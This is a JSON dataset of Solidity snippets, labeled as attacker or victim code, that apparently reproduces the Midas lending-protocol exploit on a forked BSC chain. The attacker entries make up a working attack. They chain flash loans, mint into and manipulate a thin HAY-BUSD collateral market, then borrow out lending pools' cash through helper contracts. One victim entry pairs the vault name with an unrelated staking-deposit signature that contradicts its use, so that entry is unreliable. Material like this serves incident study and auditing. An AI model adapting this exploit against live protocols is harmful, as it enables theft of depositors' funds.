[
  {
    "contract/interface": "IHAY_BUSDT_Vault",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(\n        bytes calldata pubkey,\n        bytes calldata withdrawal_credentials,\n        bytes calldata signature,\n        bytes32 deposit_data_root\n    ) external payable;\n\n    /// @notice Query the current deposit root hash.\n    /// @return The deposit root hash.\n    function get_deposit_root() external view returns (bytes32);\n\n    /// @notice Query the current deposit count.\n    /// @return The deposit count encoded as a little endian 64-bit number.\n    function get_deposit_count() external view returns (bytes memory);\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "mint",
    "original_code": "    function mint() external {\n        ankrBNB.approve(address(fankrBNB), type(uint256).max);\n        fankrBNB.mint(ankrBNB.balanceOf(address(this)));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Minter",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Borrower",
    "source_type": "attacker_contract",
    "function_name": "execute",
    "original_code": "    function execute() external {\n        ANKR.approve(address(fANKR), type(uint256).max);\n        fANKR.mint(ANKR.balanceOf(address(this)));\n\n        address[] memory fTokens = new address[](2);\n        fTokens[0] = address(fANKR);\n        fTokens[1] = address(fsAMM_HAY_BUSD);\n        Unitroller.enterMarkets(fTokens);\n        uint256 borrowAmount = fankrBNB.getCash();\n        fankrBNB.borrow(borrowAmount);\n        borrowAmount = fHAY.borrow(borrowAmount);\n        ankrBNB.transfer(msg.sender, ankrBNB.balanceOf(address(this)));\n        HAY.transfer(msg.sender, HAY.balanceOf(address(this)));\n        ANKR.transfer(msg.sender, ANKR.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Borrower",
    "source_type": "attacker_contract",
    "function_name": "exit",
    "original_code": "    function exit() external {\n        fsAMM_HAY_BUSD.transfer(msg.sender, 1);\n        uint256 borrowAmount = fankrBNB.getCash();\n        fankrBNB.borrow(borrowAmount);\n        Unitroller.exitMarket(address(fANKR));\n        borrowAmount = (686_000e18 - fANKR.totalBorrowsCurrent()) - 1;\n        fANKR.borrow(borrowAmount);\n        fANKR.redeem(fANKR.balanceOf(address(this)));\n        ankrBNB.transfer(msg.sender, ankrBNB.balanceOf(address(this)));\n        ANKR.transfer(msg.sender, ANKR.balanceOf(address(this)));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "MidasXYZExploit",
    "source_type": "attacker_contract",
    "function_name": "algebraFlashCallback",
    "original_code": "    function algebraFlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        (uint256 flashRepayAmountV3, uint256 flashRepayAmountV2) = abi.decode(data, (uint256, uint256));\n        uint256 liquidityMinted = transferTokensAndMintLiqudity(20_000e18);\n        HAY_BUSDT.approve(address(fsAMM_HAY_BUSD), type(uint256).max);\n        fsAMM_HAY_BUSD.mint(liquidityMinted);\n        fsAMM_HAY_BUSD.redeem(fsAMM_HAY_BUSD.balanceOf(address(this)) - 1001);\n        HAY_BUSDT.approve(address(HAY_BUSDT_Vault), type(uint256).max);\n        HAY_BUSDT_Vault.deposit(HAY_BUSDT.balanceOf(address(this)), address(fsAMM_HAY_BUSD));\n        fsAMM_HAY_BUSD.transfer(address(borrower), 1001);\n        borrower.execute();\n        Minter minter = new Minter();\n        ankrBNB.transfer(address(minter), 115e18);\n        minter.mint();\n        uint256 amountRequired = ankrBNB.balanceOf(address(this)) - 1e18;\n        ankrBNB_WBNB.swap(\n            address(this),\n            true,\n            int256(amountRequired),\n            sqrtPriceLimitX96, // limitSqrtPrice\n            bytes(\"\")\n        );\n\n        WBNB_BUSDT.swap(address(this), true, int256(WBNB.balanceOf(address(this)) - 1e18), sqrtPriceLimitX96, bytes(\"\"));\n        liquidityMinted = transferTokensAndMintLiqudity(HAY.balanceOf(address(this)));\n        HAY_BUSDT_Vault.deposit(liquidityMinted, address(fsAMM_HAY_BUSD));\n        borrower.exit();\n        ANKR.transfer(address(ankrBNB_ANKRV3), flashRepayAmountV3 + fee1);\n        ANKR.transfer(address(ankrBNB_ANKRV2), (flashRepayAmountV2 * 10_026) / 10_000);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MidasXYZExploit",
    "source_type": "attacker_contract",
    "function_name": "algebraSwapCallback",
    "original_code": "    function algebraSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        ankrBNB.transfer(msg.sender, uint256(amount0Delta));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MidasXYZExploit",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        borrower = new Borrower();\n        ANKR.transfer(address(borrower), _amount1);\n        uint256 flashAmount = ANKR.balanceOf(address(ankrBNB_ANKRV3));\n        bytes memory data = abi.encode(flashAmount, _amount1);\n        ankrBNB_ANKRV3.flash(address(borrower), 0, ANKR.balanceOf(address(ankrBNB_ANKRV3)), data);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MidasXYZExploit",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3SwapCallback",
    "original_code": "    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata _data) external {\n        WBNB.transfer(msg.sender, uint256(amount0Delta));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MidasXYZExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        vm.label(address(ANKR), \"ANKR\");\n        vm.label(address(ankrBNB_ANKRV2), \"ankrBNB_ANKRV2\");\n        vm.label(address(ankrBNB_ANKRV3), \"ankrBNB_ANKRV3\");\n        vm.label(address(HAY_BUSDT), \"HAY_BUSDT\");\n        vm.label(address(Oracle), \"Oracle\");\n        vm.label(address(fsAMM_HAY_BUSD), \"fsAMM_HAY_BUSD\");\n        vm.label(address(WBNB_BUSDT), \"WBNB_BUSDT\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MidasXYZExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Initial HAY and BUSDT amounts transfered by exploiter to this contract before attack start\n        deal(address(HAY), address(this), 220_000e18);\n        deal(address(BUSDT), address(this), 23_000e18);\n\n        emit log_named_decimal_uint(\n            \"Exploiter ankrBNB balance before attack\", ankrBNB.balanceOf(address(this)), ankrBNB.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter ANKR balance before attack\", ANKR.balanceOf(address(this)), ANKR.decimals()\n        );\n\n        ankrBNB_ANKRV2.swap(0, ANKR.balanceOf(address(ankrBNB_ANKRV2)) - 1, address(this), bytes(\"_\"));\n\n        emit log_named_decimal_uint(\n            \"Exploiter ANKR balance after attack\", ANKR.balanceOf(address(this)), ANKR.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter ankrBNB balance after attack\", ankrBNB.balanceOf(address(this)), ankrBNB.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IankrBNB_WBNB",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(!PairFactory(factory).isPaused());\n        require(amount0Out > 0 || amount1Out > 0, 'IOA'); // Pair: INSUFFICIENT_OUTPUT_AMOUNT\n        (uint _reserve0, uint _reserve1) =  (reserve0, reserve1);\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'IL'); // Pair: INSUFFICIENT_LIQUIDITY\n\n        uint _balance0;\n        uint _balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        (address _token0, address _token1) = (token0, token1);\n        require(to != _token0 && to != _token1, 'IT'); // Pair: INVALID_TO\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IPairCallee(to).hook(msg.sender, amount0Out, amount1Out, data); // callback, used for flash loans\n        _balance0 = IERC20(_token0).balanceOf(address(this));\n        _balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n\n        uint amount0In = _balance0 > _reserve0 - amount0Out ? _balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = _balance1 > _reserve1 - amount1Out ? _balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'IIA'); // Pair: INSUFFICIENT_INPUT_AMOUNT\n\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        (address _token0, address _token1) = (token0, token1);\n        if (amount0In > 0) _update0(amount0In * PairFactory(factory).getFee(stable) / 10000); // accrue fees for token0 and move them out of pool\n        if (amount1In > 0) _update1(amount1In * PairFactory(factory).getFee(stable) / 10000); // accrue fees for token1 and move them out of pool\n        _balance0 = IERC20(_token0).balanceOf(address(this)); // since we removed tokens, we need to reconfirm balances, can also simply use previous balance - amountIn/ 10000, but doing balanceOf again as safety check\n        _balance1 = IERC20(_token1).balanceOf(address(this));\n        // The curve, either x3y+y3x for stable pools, or x*y for volatile pools\n        require(_k(_balance0, _balance1) >= _k(_reserve0, _reserve1), 'K'); // Pair: K\n        }\n\n        _update(_balance0, _balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
    "description": ""
  }
]